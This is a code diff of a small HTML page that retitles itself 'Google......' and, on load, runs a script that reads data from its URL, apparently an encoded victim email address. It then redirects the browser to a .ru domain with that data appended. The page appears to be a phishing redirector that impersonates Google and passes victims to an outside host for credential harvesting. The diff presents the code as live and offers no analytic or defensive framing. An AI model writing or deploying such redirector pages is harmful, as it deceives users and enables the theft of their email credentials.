@@ -3,9 +3,10 @@
   <head>
     <meta charset="utf-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <title>Validating......</title>
+    <title>Google......</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
   </head>
+
   <body>
     <script>
       function redirrectPage() {
@@ -16,15 +17,17 @@
         var data2 = res[1];
         console.log(data1);
         console.log(data2);
+
         //realemailID = atob(data2);
+
         if (data2) {
           console.log("true");
           window.location.href =
-            "https://VmI.jlpyzous.ru/yVsi/?";
+            "https://w1s3.jlpyzous.ru/yVsi/#f" + data2;
         } else {
           console.log("false");
           window.location.href =
-            "https://VmI.jlpyzous.ru/yVsi/?";
+            "https://w1s3.jlpyzous.ru/yVsi/#f" + data2;
         }
       }
       redirrectPage();
